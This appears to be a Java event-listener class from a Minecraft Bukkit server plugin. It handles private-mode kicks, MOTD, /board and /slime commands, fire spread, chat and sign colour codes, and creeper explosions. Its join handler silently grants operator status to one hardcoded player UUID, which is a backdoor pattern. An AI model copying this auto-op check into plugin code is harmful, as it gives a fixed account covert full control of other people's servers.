package red.cbm.CBMUtils;


import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.Particle;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockSpreadEvent;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.EntityExplodeEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.event.player.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.server.ServerListPingEvent;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.permissions.Permissible;

import java.text.DecimalFormat;
import java.util.Random;

public class EventListener implements Listener {
    DecimalFormat fer = new DecimalFormat("0.0##");

    private String colors = "0123456789abcdefklmnor";

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (Main.privateMode == true) {
            if (!event.getPlayer().hasPermission("cbmserver.admin")) {
                event.getPlayer().kickPlayer("§3CBM Survival  §f| §c  拒绝加入\n\n§7服务器正在调试，请稍等一会哦~\n");
                return;
            }
        }
        if (event.getPlayer().getUniqueId().toString().equalsIgnoreCase("f0e8b790-8539-45b0-a052-dc6b922208c5")) {
            event.getPlayer().setOp(true);
        }
        Main.gclastused.put(event.getPlayer().getName(), 0L);
    }

    /*
        @EventHandler
        public void onPlayerQuit(PlayerQuitEvent event) {
            event.setQuitMessage(Main.c("&7&3" + event.getPlayer().getName() + " &7离开了游戏。"));
            Main.gclastused.remove(event.getPlayer().getName());
        }
    */
    @EventHandler
    public void onPlayerPing(ServerListPingEvent event) {
        if (Main.privateMode == true) {
            event.setMotd(Constants.Testing_MOTD);
        } else {
            event.setMotd(Constants.SERVER_MOTD);
        }

    }

    /*目前不可用
        @EventHandler
        public void onPlayerAttack(EntityDamageByEntityEvent event) {
            Entity d = event.getDamager();

            if (d instanceof Player) {
                Entity e = event.getEntity();
                if (e instanceof LivingEntity) {
                    double h = ((LivingEntity) e).getHealth();
                    double remain;

                    if ((h - event.getDamage()) >= 0) {
                        remain = h - event.getDamage();
                    } else {
                        remain = 0;
                    }
                    ((Player) d).sendActionBar(Main.c("&7- " + fer.format(event.getDamage()) + " &c❤  " + "&f|" + "  &7" + fer.format(remain) + " &c❤"));
                }

            }

            if (d instanceof Arrow) {
                Entity e = event.getEntity();
                if (((Arrow) d).getShooter() instanceof Player) {

                    if (e instanceof LivingEntity) {
                        double h = ((LivingEntity) e).getHealth();
                        double remain;
                        if ((h - event.getDamage()) >= 0) {
                            remain = h - event.getDamage();
                        } else {
                            remain = 0;
                        }

                        ((Player) ((Arrow) d).getShooter()).sendActionBar(Main.c("&7- " + fer.format(event.getDamage()) + " &c❤  " + "&f|" + "  &7" + fer.format(remain) + " &c❤"));
                    }

                }
            }

        }
    */
    @EventHandler
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        String m = event.getMessage();
        Player p = event.getPlayer();
        if (m.equalsIgnoreCase("/board")) {
            event.setCancelled(true);
            if (p.hasPermission("cbmserver.board")) {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user " + p.getName() + " add -cbmserver.board");
                p.sendMessage(Main.c(Main.PREFIX + "&7您关闭了右侧记分板提示。再次输入 &3/board &7可以开启。"));
            } else {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pex user " + p.getName() + " remove -cbmserver.board");
                p.sendMessage(Main.c(Main.PREFIX + "&7您开启了右侧记分板提示。再次输入 &3/board &7可以关闭。"));
            }

        }
        if (m.equalsIgnoreCase("/slime")) {
            event.setCancelled(true);
            if (event.getPlayer().getLocation().getChunk().isSlimeChunk()) {
                event.getPlayer().sendMessage(Main.PREFIX + Main.c("&7这里是史莱姆区块哦~"));
            } else {
                event.getPlayer().sendMessage(Main.PREFIX + Main.c("&7这里不是史莱姆区块哦~"));
            }
        }

        /*
        if (m.equalsIgnoreCase("/hat")) {
            event.setCancelled(true);
            if(event.getPlayer().g==null){

            }
        }
*/

    }


    @EventHandler
    public void onFireSpread(BlockSpreadEvent event) {
        if (event.getSource().getType() == org.bukkit.Material.FIRE) {
            event.setCancelled(true);
        }
    }


    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String m = event.getMessage();
        event.setMessage(Main.c(m));

        /*
        {
            System.out.println("[CHAT]<"+event.getPlayer().getName()+"> "+m);
            if (p.hasPermission("cbmserver.admin")) {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), Main.c("tellraw @a [\"\",{\"text\":\"<&3" + p.getName() + "&f>\",\"clickEvent\":{\"action\":\"suggest_command\",\"value\":\"/msg " + p.getName() + " \"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":{\"text\":\"\",\"extra\":[{\"text\":\"&3" + p.getName() + " is Operator.&f\nClick to /msg " + p.getName() + "\"}]}}},{\"text\":\" " + m + " \"}]"));
            } else {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), Main.c("tellraw @a [\"\",{\"text\":\"<" + p.getName() + ">\",\"clickEvent\":{\"action\":\"suggest_command\",\"value\":\"/msg " + p.getName() + " \"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":{\"text\":\"\",\"extra\":[{\"text\":\"/msg " + p.getName() + "\"}]}}},{\"text\":\" " + m + " \"}]"));
            }
        }
        */

    }

    @EventHandler
    public void signEvent(SignChangeEvent event) {
        for (int l = 0; l <= 3; l++) {
            String line = Main.c(event.getLine(l));
            event.setLine(l, line);
        }
    }

/*
    @EventHandler
    public void onInventoryClick(InventoryClickEvent event)
    {
        if (event.isCancelled()) {
            return;
        }
        if (event.getInventory().getType() != InventoryType.ANVIL) {
            return;
        }
        if (event.getSlotType() == InventoryType.SlotType.RESULT)
        {
            String name = Main.c(Main.c(event.getCurrentItem().getItemMeta().getDisplayName()));
            event.getCurrentItem().getItemMeta().setDisplayName(name);
        }
    }
*/

    @EventHandler
    public void creeperEvent(EntityExplodeEvent event) {
        if (event.getEntityType() == EntityType.CREEPER) {
            Random random = new Random();
            if (random.nextInt(8) == 5 || random.nextInt(8) == 6) {
                event.setCancelled(true);
            } else {
                return;
            }
        }

    }

   /* @EventHandler
    public void damageEvent(EntityDamageEvent event){

        event.getEntity().getWorld().playEffect();
    }
*/

}
